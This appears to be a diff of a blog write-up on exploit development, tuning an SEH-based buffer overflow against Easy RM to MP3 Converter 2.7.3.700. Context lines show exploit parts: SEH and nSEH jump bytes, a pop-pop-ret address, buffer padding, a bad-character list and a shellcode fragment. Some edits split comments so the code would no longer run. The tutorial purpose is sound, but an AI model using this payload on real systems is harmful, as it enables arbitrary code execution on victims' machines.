@@ -144,7 +144,8 @@ import struct
 
 sjmp = "\xE9\x73\xEC\xFF\xFF"
 nseh = "\xEB\xF9\x90\x90"
-seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
+seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
+ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
 
 buffer = "A" * 44000 + "\xcc" * 200 + "A" * (45388 - 44000 - 205) + sjmp + nseh + seh
 
@@ -177,7 +178,8 @@ badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x1
 
 sjmp = "\xE9\x73\xEC\xFF\xFF"
 nseh = "\xEB\xF9\x90\x90"
-seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
+seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
+ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
 
 buffer = "A" * 44000 + "w00tw00t" + badchars  + "A" * (45388 - 44000 - 205 - 8) + sjmp + nseh + seh
 
@@ -208,9 +210,9 @@ Comparing the bad characters with mona:
 
 ![](/assets/img/Findings2/18.png)
 
-As seen, the byte 09 is taken as a bad character. Normally, 09 is not a bad character, on the other hand, 0a is normally a terrible character, as it means "line feed", used for CRLF combination. It is probable that 09 is being detected for such reason.
+As seen, the byte 09 is taken as a bad character. Normally, 09 is not a bad character, on the other hand, 0a, which is the following byte to 09, is normally a terrible character as it means "line feed", used for CRLF combination. It is probable that 09 is being detected for such reason.
 
-If the process is yet repeated, 0a is found as a bad character:
+If the process is yet repeated, 0a is taken as a bad character:
 
 ![](/assets/img/Findings2/19.png)
 
@@ -285,7 +287,8 @@ buf += b"\xbb\x45\x5f\xd3\x5a\xd6\x03\x3a\xf9\x5e\xa1\x42"
 
 sjmp = "\xE9\x73\xEC\xFF\xFF"
 nseh = "\xEB\xF9\x90\x90"
-seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
+seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
+ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
 
 buffer = "A" * 44000 + buf + "A" * (45388 - 44000 - len(buf) - 5) + sjmp + nseh + seh
 
